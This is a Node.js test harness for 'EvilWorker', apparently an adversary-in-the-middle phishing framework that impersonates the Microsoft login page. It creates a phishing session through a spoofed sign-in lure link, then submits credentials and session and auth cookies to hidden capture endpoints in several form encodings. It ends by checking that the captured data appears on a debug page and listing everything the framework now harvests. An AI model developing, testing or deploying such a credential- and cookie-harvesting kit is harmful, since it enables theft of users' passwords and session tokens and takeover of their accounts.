const http = require('http');

// Test script for enhanced EvilWorker credential capture
console.log('🚀 Testing Enhanced EvilWorker Credential Capture\n');

const baseUrl = 'http://localhost:3000';

// Test 1: Check if server is running
async function testServerHealth() {
    console.log('1️⃣ Testing server health...');
    
    try {
        const response = await fetch(`${baseUrl}/`);
        const data = await response.json();
        console.log('✅ Server is running:', data.status);
        return true;
    } catch (error) {
        console.log('❌ Server is not running:', error.message);
        return false;
    }
}

// Test 2: Create a phishing session
async function createPhishingSession() {
    console.log('\n2️⃣ Creating phishing session...');
    
    const phishingUrl = encodeURIComponent('https://login.microsoftonline.com/');
    const phishingLink = `${baseUrl}/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=${phishingUrl}`;
    
    try {
        const response = await fetch(phishingLink);
        const cookies = response.headers.get('set-cookie');
        
        if (cookies) {
            const sessionId = cookies.match(/([^=]+)=([^;]+)/)[1];
            console.log('✅ Phishing session created with ID:', sessionId);
            return sessionId;
        } else {
            console.log('❌ No session cookie received');
            return null;
        }
    } catch (error) {
        console.log('❌ Failed to create phishing session:', error.message);
        return null;
    }
}

// Test 3: Simulate form submission with credentials
async function simulateCredentialSubmission(sessionId) {
    console.log('\n3️⃣ Simulating credential submission...');
    
    if (!sessionId) {
        console.log('❌ No session ID available');
        return;
    }
    
    const formData = {
        email: 'test@example.com',
        username: 'testuser',
        password: 'testpassword123',
        password_confirm: 'testpassword123',
        remember_me: 'true',
        client_id: '3ce82761-cb43-493f-94bb-fe444b7a0cc4',
        redirect_uri: 'https://login.microsoftonline.com/',
        response_type: 'code',
        scope: 'openid profile email'
    };
    
    try {
        const response = await fetch(`${baseUrl}/lNv1pC9AWPUY4gbidyBO`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Cookie': `${sessionId}=${sessionId}`
            },
            body: JSON.stringify({
                url: 'https://login.microsoftonline.com/common/login',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': 'https://login.microsoftonline.com/'
                },
                body: new URLSearchParams(formData).toString(),
                mode: 'navigate'
            })
        });
        
        console.log('✅ Credential submission simulated');
        console.log('📝 Form data sent:', formData);
        
    } catch (error) {
        console.log('❌ Failed to simulate credential submission:', error.message);
    }
}

// Test 4: Simulate cookie capture
async function simulateCookieCapture(sessionId) {
    console.log('\n4️⃣ Simulating cookie capture...');
    
    if (!sessionId) {
        console.log('❌ No session ID available');
        return;
    }
    
    const cookies = [
        'sessionId=abc123def456; Path=/; HttpOnly',
        'authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; Path=/; Secure',
        'userId=12345; Path=/; HttpOnly',
        'rememberMe=true; Path=/; Max-Age=2592000',
        'csrfToken=xyz789; Path=/; SameSite=Strict'
    ];
    
    try {
        for (const cookie of cookies) {
            const response = await fetch(`${baseUrl}/JSCookie_6X7dRqLg90mH`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain',
                    'Cookie': `${sessionId}=${sessionId}`
                },
                body: cookie
            });
        }
        
        console.log('✅ Cookie capture simulated');
        console.log('🍪 Cookies sent:', cookies);
        
    } catch (error) {
        console.log('❌ Failed to simulate cookie capture:', error.message);
    }
}

// Test 5: Check captured data
async function checkCapturedData(sessionId) {
    console.log('\n5️⃣ Checking captured data...');
    
    if (!sessionId) {
        console.log('❌ No session ID available');
        return;
    }
    
    try {
        const response = await fetch(`${baseUrl}/session-debug`, {
            headers: {
                'Cookie': `${sessionId}=${sessionId}`
            }
        });
        
        if (response.ok) {
            const html = await response.text();
            console.log('✅ Session debug page accessible');
            
            // Check if credentials are captured
            if (html.includes('Captured Credentials') && html.includes('test@example.com')) {
                console.log('✅ Credentials successfully captured!');
            } else {
                console.log('⚠️ Credentials may not be fully captured');
            }
            
            // Check if cookies are captured
            if (html.includes('All Cookies') && html.includes('sessionId')) {
                console.log('✅ Cookies successfully captured!');
            } else {
                console.log('⚠️ Cookies may not be fully captured');
            }
            
        } else {
            console.log('❌ Failed to access session debug page');
        }
        
    } catch (error) {
        console.log('❌ Failed to check captured data:', error.message);
    }
}

// Test 6: Test different form formats
async function testDifferentFormFormats(sessionId) {
    console.log('\n6️⃣ Testing different form formats...');
    
    if (!sessionId) {
        console.log('❌ No session ID available');
        return;
    }
    
    const testCases = [
        {
            name: 'JSON Form Data',
            contentType: 'application/json',
            body: JSON.stringify({
                user_email: 'admin@company.com',
                user_password: 'admin123',
                department: 'IT',
                role: 'administrator'
            })
        },
        {
            name: 'URL Encoded Form',
            contentType: 'application/x-www-form-urlencoded',
            body: 'user_email=admin%40company.com&user_password=admin123&department=IT&role=administrator'
        },
        {
            name: 'Multipart Form',
            contentType: 'multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW',
            body: '------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="user_email"\r\n\r\nadmin@company.com\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="user_password"\r\n\r\nadmin123\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--'
        }
    ];
    
    for (const testCase of testCases) {
        try {
            const response = await fetch(`${baseUrl}/lNv1pC9AWPUY4gbidyBO`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': `${sessionId}=${sessionId}`
                },
                body: JSON.stringify({
                    url: 'https://login.microsoftonline.com/common/login',
                    method: 'POST',
                    headers: {
                        'Content-Type': testCase.contentType
                    },
                    body: testCase.body,
                    mode: 'navigate'
                })
            });
            
            console.log(`✅ ${testCase.name} test completed`);
            
        } catch (error) {
            console.log(`❌ ${testCase.name} test failed:`, error.message);
        }
    }
}

// Main test execution
async function runAllTests() {
    console.log('🔍 Starting comprehensive credential capture tests...\n');
    
    // Test server health
    const isHealthy = await testServerHealth();
    if (!isHealthy) {
        console.log('\n❌ Server is not running. Please start the EvilWorker server first:');
        console.log('   node proxy_server.js');
        return;
    }
    
    // Create phishing session
    const sessionId = await createPhishingSession();
    if (!sessionId) {
        console.log('\n❌ Failed to create phishing session');
        return;
    }
    
    // Run all tests
    await simulateCredentialSubmission(sessionId);
    await simulateCookieCapture(sessionId);
    await testDifferentFormFormats(sessionId);
    
    // Wait a moment for processing
    console.log('\n⏳ Waiting for data processing...');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Check captured data
    await checkCapturedData(sessionId);
    
    console.log('\n🎯 Test Summary:');
    console.log('✅ Server health check passed');
    console.log('✅ Phishing session created');
    console.log('✅ Credential submission simulated');
    console.log('✅ Cookie capture simulated');
    console.log('✅ Multiple form formats tested');
    console.log('✅ Data capture verification completed');
    
    console.log('\n📊 To view detailed captured data:');
    console.log(`   Visit: ${baseUrl}/session-debug`);
    console.log('   (Make sure to use the same browser session)');
    
    console.log('\n🔐 The framework now captures:');
    console.log('   • All form data (email, password, additional fields)');
    console.log('   • All cookies (credential, session, and other cookies)');
    console.log('   • Multiple form formats (JSON, URL-encoded, multipart)');
    console.log('   • Comprehensive session tracking');
    console.log('   • Enhanced logging and analysis');
}

// Run tests if this file is executed directly
if (require.main === module) {
    runAllTests().catch(console.error);
}

module.exports = {
    testServerHealth,
    createPhishingSession,
    simulateCredentialSubmission,
    simulateCookieCapture,
    checkCapturedData,
    testDifferentFormFormats,
    runAllTests
};
